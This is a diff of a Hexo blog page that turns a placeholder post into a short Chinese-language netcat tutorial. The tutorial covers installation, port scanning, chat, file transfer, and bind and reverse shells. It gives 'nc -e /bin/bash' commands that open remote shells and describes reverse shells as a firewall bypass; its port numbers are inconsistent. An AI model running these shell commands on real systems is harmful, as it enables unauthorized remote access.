@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="我的第一个博客, blog,haclmker,hacking">
+    <meta name="keywords" content="netcat, blog,haclmker,hacking">
     <meta name="description" content="you need learn hacking ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>我的第一个博客 | haclmker</title>
+    <title>netcat | haclmker</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -251,12 +251,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/images/pasted-7.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">我的第一个博客</h1>
+                    <h1 class="description center-align post-title">netcat</h1>
                 </div>
             </div>
         </div>
@@ -370,12 +370,29 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">网络渗透</span>
+                            </a>
+                        
+                            <a href="/tags/netcat/">
+                                <span class="chip bg-color">netcat</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/kali-linux/" class="post-category">
+                                kali linux
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -384,7 +401,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-08-04
+                    2021-08-08
                 </div>
                 
 
@@ -405,7 +422,43 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <hr>
+                <h1 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h1><h2 id="netcat的简介"><a href="#netcat的简介" class="headerlink" title="netcat的简介"></a>netcat的简介</h2><p>netcat是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，可以在脚本中以多种方式使用它。</p>
+<h2 id="netcat的安装"><a href="#netcat的安装" class="headerlink" title="netcat的安装"></a>netcat的安装</h2><h3 id="linux安装："><a href="#linux安装：" class="headerlink" title="linux安装："></a>linux安装：</h3><pre><code>sudo apt install netcat</code></pre>
+<h3 id="windows安装："><a href="#windows安装：" class="headerlink" title="windows安装："></a>windows安装：</h3><p>点击这里<a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/">netcat</a>下载netcat的文件和配置。</p>
+<h4 id="windows配置："><a href="#windows配置：" class="headerlink" title="windows配置："></a>windows配置：</h4><p>进入下载netcat的目录，按住左shift+鼠标右键选择powershell输入：</p>
+<pre><code>.\netcat</code></pre>
+<p>当出现<code>Cmd line:</code>就配置成功，你可以配置环境变量点这里<a target="_blank" rel="noopener" href="https://blog.csdn.net/BoomLee/article/details/102563472">怎么设置环境变量</a></p>
+<h2 id="netcat的使用"><a href="#netcat的使用" class="headerlink" title="netcat的使用"></a>netcat的使用</h2><h3 id="端口扫描："><a href="#端口扫描：" class="headerlink" title="端口扫描："></a>端口扫描：</h3><pre><code>nc -z -v -n 127.0.0.1 21-25</code></pre>
+<p>可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.<br>-z 参数告诉netcat使用0 IO,连接成功后立即关闭连接，不进行数据交换<br>-v 参数指使用冗余选项，即详细输出<br>-n 参数告诉netcat 不使用DNS解析，即仅仅是一串IP数字， 一般如果后面是跟IP数字的话，就带上-n参数；跟着是域名的话，就不带-n参数。</p>
+<h3 id="聊天服务"><a href="#聊天服务" class="headerlink" title="聊天服务"></a>聊天服务</h3><p>服务端(ip=192.168.1.7)：<pre><code>nc -l -p 4444</code></pre>4444是开放的端口<br>客户端:<pre><code>nc 192.168.1.8</code></pre>192.168.1.7是服务端的IP地址<br>客户端和服务端是同一网端下!检测是否在同一网段可以采用互相ping ip<br>可以点击这里查看详细记录<a target="_blank" rel="noopener" href="https://zhidao.baidu.com/question/69628323.html">百度教程</a></p>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>例子环境：</p>
+<ul>
+<li>A电脑ip:192.168.1.2</li>
+<li>B电脑ip:192.168.1.3</li>
+</ul>
+<p>A电脑为服务端，B电脑为客户端。以a文件为要发送的文件。服务端要发送a文件到客户端，客户端则接受服务端发来的a文件。<br>A电脑命令如下：</p>
+<pre><code>nc -l -p 4444 < a </code></pre>
+<p>B电脑命令如下:</p>
+<pre><code> nc 192.168.1.2 4444 > a</code></pre>
+<p>反正则调换一下</p>
+<h3 id="shell连接"><a href="#shell连接" class="headerlink" title="shell连接"></a>shell连接</h3><h4 id="1-正向连接"><a href="#1-正向连接" class="headerlink" title="1:正向连接"></a>1:正向连接</h4><h6 id="例子环境："><a href="#例子环境：" class="headerlink" title="例子环境："></a>例子环境：</h6><ul>
+<li>A电脑ip:192.168.1.2</li>
+<li>B电脑ip:192.168.1.3<h6 id="例子情况-用B电脑连接A电脑shell"><a href="#例子情况-用B电脑连接A电脑shell" class="headerlink" title="例子情况:用B电脑连接A电脑shell"></a>例子情况:用B电脑连接A电脑shell</h6></li>
+<li>A电脑为服务端</li>
+<li>B电脑为客户端<br>服务端命令如下：<pre><code>nc -l -p 4444 -e /bin/bash</code></pre>
+客户端命令如下：<pre><code>nc 192.168.1.2</code></pre>
+<h4 id="2-反面连接-用于绕过防火墙"><a href="#2-反面连接-用于绕过防火墙" class="headerlink" title="2.反面连接(用于绕过防火墙)"></a>2.反面连接(用于绕过防火墙)</h4><h6 id="例子环境：-1"><a href="#例子环境：-1" class="headerlink" title="例子环境："></a>例子环境：</h6></li>
+<li>A电脑ip:192.168.1.2</li>
+<li>B电脑ip:192.168.1.3<h6 id="例子情况："><a href="#例子情况：" class="headerlink" title="例子情况："></a>例子情况：</h6></li>
+<li>1.A机器连接B机器的shell，如果按照正向shell的做法，应该是把A当成netcat的客户端，把B当成netcat的服务端，在B上用-l参数监听输入的链接。</li>
+<li>2.但是如果防火墙屏蔽了输入，只允许输出，那么这时候就是反向shell发挥作用的时候了。</li>
+<li>3.反向shell的做法是把A当成netcat的客户端，把B当成netcat的客户端，然后在A上用-l参数监听netcat的链接。</li>
+</ul>
+<p>A电脑命令如下：</p>
+<pre><code>nc -l -p 20000</code></pre>
+<p>B电脑命令如下:</p>
+<pre><code>nc 192.168.1.3 4444 -e /bin/bash</code></pre>
+<h2 id="结言"><a href="#结言" class="headerlink" title="结言:"></a>结言:</h2><p>本博文是netcat的基础用法。欢迎订阅rss和打赏，请作者喝一杯冰可乐吧！</p>
 
                 
             </div>
@@ -432,7 +485,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2/index.html">http://example.com/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2/index.html</a>
+                    <a href="http://example.com/2021/080857223.html">http://example.com/2021/080857223.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -469,7 +522,15 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">网络渗透</span>
+                                </a>
+                            
+                                <a href="/tags/netcat/">
+                                    <span class="chip bg-color">netcat</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -639,18 +700,16 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2/index.html">
+                <a href="/2021/082022371.html">
                     <div class="card-image">
                         
+                        <img src="/images/pasted-8.png" class="responsive-img" alt="crunch">
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="我的第一个博客">
-                        
-                        <span class="card-title">我的第一个博客</span>
+                        <span class="card-title">crunch</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -660,18 +719,33 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-04
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-20
+                        </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            haclmker
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/kali-linux/" class="post-category">
+                                    kali linux
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">网络渗透</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90/">
+                        <span class="chip bg-color">字典生成</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -679,16 +753,15 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2/index.html">
+                <a href="/2021/080627682.html">
                     <div class="card-image">
                         
+                        <img src="/images/pasted-5.png" class="responsive-img" alt="hexo admin写博客">
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="我的第一个博客">
-                        
-                        <span class="card-title">我的第一个博客</span>
+                        <span class="card-title">hexo admin写博客</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -699,17 +772,28 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-04
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-06
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            haclmker
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%8D%9A%E5%AE%A2%E6%95%99%E5%AD%A6/" class="post-category">
+                                    博客教学
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/hexo/">
+                        <span class="chip bg-color">hexo</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
